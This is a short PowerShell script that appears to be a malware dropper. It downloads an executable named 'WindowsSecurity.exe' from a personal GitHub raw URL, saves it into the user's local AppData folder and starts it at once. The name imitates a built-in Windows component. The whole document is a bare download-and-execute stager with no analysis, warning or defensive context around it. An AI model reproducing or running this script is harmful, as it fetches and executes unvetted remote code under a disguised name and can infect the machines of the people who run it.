$u = 'https://raw.githubusercontent.com/honggiabao2911/a/main/WindowsSecurity.exe'
$p1 = "$env:LOCALAPPDATA\WindowsSecurity.exe"
iwr $u -o $p1
Start $p1
